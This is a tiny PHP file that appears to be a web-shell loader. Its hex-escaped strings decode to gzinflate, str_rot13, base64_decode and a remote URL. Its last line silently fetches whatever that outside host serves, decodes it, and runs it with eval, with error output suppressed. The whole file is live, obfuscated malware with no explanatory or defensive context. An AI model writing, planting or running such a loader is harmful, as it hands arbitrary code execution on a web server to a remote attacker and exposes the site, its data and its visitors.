<?php
$x="\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65";
$xx="\x73\x74\x72\x5f\x72\x6f\x74\x31\x33";
$xxx="\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65";
$xxxx="\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";
$sc="\x68\x74\x74\x70\x3a\x2f\x2f\x66\x75\x6b\x79\x2e\x79\x6e\x2e\x6c\x74\x2f\x63\x6d\x64";
@eval($x($xx($xxx($xxxx(file_get_contents($sc))))));
?>